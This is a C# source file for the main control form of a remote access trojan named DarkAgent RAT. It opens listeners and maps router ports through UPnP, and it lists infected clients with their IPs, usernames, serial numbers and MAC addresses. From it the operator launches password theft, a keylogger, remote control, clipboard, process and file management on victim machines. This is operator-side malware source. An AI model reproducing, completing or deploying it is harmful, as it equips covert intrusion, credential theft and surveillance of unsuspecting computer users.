using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using DarkAgent_RAT.src.Network;
using DarkAgent_RAT.src;
using DarkAgent_RAT.src.Network.DataNetwork.Packets;
using DarkAgent_RAT.src.Network.FileServer.Packets;
using System.Threading;
using DarkAgent_RAT.src.Utils;
using DarkAgent_RAT.src.Engines;
using DarkAgent_RAT.src.Network.DataNetwork.Packets.Send;
using DarkAgent_RAT.src.Events;
using System.Net;
using NATUPNPLib;
using System.Collections;
using DarkAgent_RAT.src.Network.DataNetwork;
using DarkAgent_RAT.src.Network.FileServer;

namespace DarkAgent_RAT
{
    public partial class Form1 : DevComponents.DotNetBar.Office2007Form
    {
        public Form1(){InitializeComponent();}
        static Form1 instance = null;
        static readonly object padlock = new object();

        public static Form1 Instance
        {
            get { lock (padlock) { if (instance == null)instance = new Form1(); return instance; } }
        }

        private List<RatClientListener> _listener;
        private List<FileClientListener> _FileListener;
        private MaxConnections maxConnections;
        private File_MaxConnections File_maxConnections;
        Thread RefreshThread;

        private void Form1_Load(object sender, EventArgs e)
        {
            //Events
            ClientDisconnectEvent.ClientDisconnect += new ClientDisconnectHandler(onClientDisconnect);

            CheckForIllegalCrossThreadCalls = false;

            settings.MainForm = this;
            _listener = new List<RatClientListener>();
            _FileListener = new List<FileClientListener>();
            maxConnections = new MaxConnections();
            File_maxConnections = new File_MaxConnections();
            ClientPacketProcessor.Initialize();
            FileClientPacketProcessor.Initialize();
        }

        #region Speficic Events

        public void onClientDisconnect(object o, ClientDisconnectEventArgs e)
        {
            for (int i = 0; i < listView3.Items.Count; i++)
            {
                if (listView3.Items[i].SubItems[3].Text == e.RemoteIP)
                    listView3.Items.RemoveAt(i);
            }
        }

        #endregion

        #region Form Events

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            RefreshThread.Abort();
        }

        private void processesToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < listView3.SelectedItems.Count; i++)
            {
                new ProcessMgr
                {
                    RemoteIP = listView3.SelectedItems[i].SubItems[3].Text,
                    ClientName = listView3.SelectedItems[i].SubItems[1].Text,
                    ClientID = Convert.ToInt32(listView3.SelectedItems[i].SubItems[0].Text)
                }.Show();
            }
        }

        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < listView3.SelectedItems.Count; i++)
            {
                new FileManager(null)
                {
                    RemoteIP = listView3.SelectedItems[i].SubItems[3].Text,
                    ClientName = listView3.SelectedItems[i].SubItems[1].Text,
                    ClientID = Convert.ToInt32(listView3.SelectedItems[i].SubItems[0].Text)
                }.Show();
            }
        }

        private void processorInformationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < listView3.SelectedItems.Count; i++)
            {
                new ProcessorInfo
                {
                    RemoteIP = listView3.SelectedItems[i].SubItems[3].Text,
                    ClientName = listView3.SelectedItems[i].SubItems[1].Text,
                    ClientID = Convert.ToInt32(listView3.SelectedItems[i].SubItems[0].Text)
                }.Show();
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            Random random = new Random();
            numericUpDown1.Value = random.Next(100000, 9999999);
            MessageBox.Show("remember the Encrypt Key has to be the same as in the Client otherwise it wouldn't work!", "DarkAgent", MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }

        private void button3_Click(object sender, EventArgs e)
        {
            if(checkBox3.Checked)
            {
                try
                {
                    UPnPNATClass UPnP = new UPnPNATClass();
                    UPnP.StaticPortMappingCollection.Add((int)numericUpDown3.Value, "TCP", (int)numericUpDown3.Value, "192.168.1.35", true, "DarkAgent RAT");
                }catch{}
            }

            if(!checkBox4.Checked)
                _listener.Add(new RatClientListener((int)numericUpDown3.Value, (int)numericUpDown1.Value));
            else
                _FileListener.Add(new FileClientListener((int)numericUpDown3.Value, (int)numericUpDown1.Value));

            string[] str = new string[2];
            str[0] = numericUpDown3.Value.ToString();
            str[1] = numericUpDown1.Value.ToString();
            ListViewItem itm = new ListViewItem(str, 0);
            listView4.Items.Add(itm);
        }

        private void button4_Click(object sender, EventArgs e)
        {
            for(int i = 0; i < listView4.SelectedItems.Count; i++)
            {
                if(listView4.SelectedItems[i].Selected)
                {
                    try
                    {
                        try
                        {
                            NATUPNPLib.UPnPNAT UPnP = new NATUPNPLib.UPnPNAT();
                            NATUPNPLib.IStaticPortMappingCollection PortMapping = UPnP.StaticPortMappingCollection;
                            PortMapping.Remove(Convert.ToInt32(listView4.SelectedItems[i].SubItems[0].Text), "TCP");
                        }catch{}

                        if(_listener.Contains(_listener[i]))
                            _listener[i].Close();
                        else if(_FileListener.Contains(_FileListener[i]))
                            _FileListener[i].Close();

                        listView4.SelectedItems[i].Remove();
                    }catch{}

                }
            }
        }

        private void getPasswordsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            List<int> IDs = new List<int>();
            for(int i = 0; i < listView3.SelectedItems.Count; i++)
                IDs.Add(Convert.ToInt32(listView3.SelectedItems[i].SubItems[0].Text));
            new Passwords { ClientIDs = IDs }.Show();
        }

        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < listView3.SelectedItems.Count; i++)
            {
                new Keylogger
                {
                    RemoteIP = listView3.SelectedItems[i].SubItems[3].Text,
                    ClientName = listView3.SelectedItems[i].SubItems[1].Text,
                    ClientID = Convert.ToInt32(listView3.SelectedItems[i].SubItems[0].Text)
                }.Show();
            }
        }

        private void remoteControlToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < listView3.SelectedItems.Count; i++)
            {
                new RemoteControl
                {
                    RemoteIP = listView3.SelectedItems[i].SubItems[3].Text,
                    ClientName = listView3.SelectedItems[i].SubItems[1].Text,
                    ClientID = Convert.ToInt32(listView3.SelectedItems[i].SubItems[0].Text)
                }.Show();
            }
        }

        private void clipboardManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < listView3.SelectedItems.Count; i++)
            {
                new ClipboardManager
                {
                    RemoteIP = listView3.SelectedItems[i].SubItems[3].Text,
                    ClientName = listView3.SelectedItems[i].SubItems[1].Text,
                    ClientID = Convert.ToInt32(listView3.SelectedItems[i].SubItems[0].Text)
                }.Show();
            }
        }

        private void copyToClipboardToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ClipboardBuilder cB = new ClipboardBuilder();
            for (int i = 0; i < listView3.SelectedItems.Count; i++)
            {
                cB.WriteLine("ID: " + listView3.SelectedItems[i].SubItems[0].Text);
                cB.WriteLine("Client Name: " + listView3.SelectedItems[i].SubItems[1].Text);
                cB.WriteLine("Country: " + listView3.SelectedItems[i].SubItems[2].Text);
                cB.WriteLine("External IP: " + listView3.SelectedItems[i].SubItems[3].Text);
                cB.WriteLine("Internal IP: " + listView3.SelectedItems[i].SubItems[4].Text);
                cB.WriteLine("Computer Name: " + listView3.SelectedItems[i].SubItems[5].Text);
                cB.WriteLine("Username: " + listView3.SelectedItems[i].SubItems[6].Text);
                cB.WriteLine("Operating System: " + listView3.SelectedItems[i].SubItems[7].Text);
                cB.WriteLine("Builder Number: " + listView3.SelectedItems[i].SubItems[8].Text);
                cB.WriteLine("OS Bits: " + listView3.SelectedItems[i].SubItems[9].Text);
                cB.WriteLine("Service Pack: " + listView3.SelectedItems[i].SubItems[10].Text);
                cB.WriteLine("OS Registered User: " + listView3.SelectedItems[i].SubItems[11].Text);
                cB.WriteLine("Serialnumber: " + listView3.SelectedItems[i].SubItems[12].Text);
                cB.WriteLine("System Directory: " + listView3.SelectedItems[i].SubItems[13].Text);
                cB.WriteLine("System Drive: " + listView3.SelectedItems[i].SubItems[14].Text);
                cB.WriteLine("Total RAM Memory: " + listView3.SelectedItems[i].SubItems[15].Text);
                cB.WriteLine("Processor: " + listView3.SelectedItems[i].SubItems[16].Text);
                cB.WriteLine("Mac Addresses: " + listView3.SelectedItems[i].SubItems[17].Text);
                cB.WriteLine("RAT version: " + listView3.SelectedItems[i].SubItems[18].Text);
            }
            if (!cB.Finish())
                MessageBox.Show("Error while copying data!");
        }
        #endregion
    }
}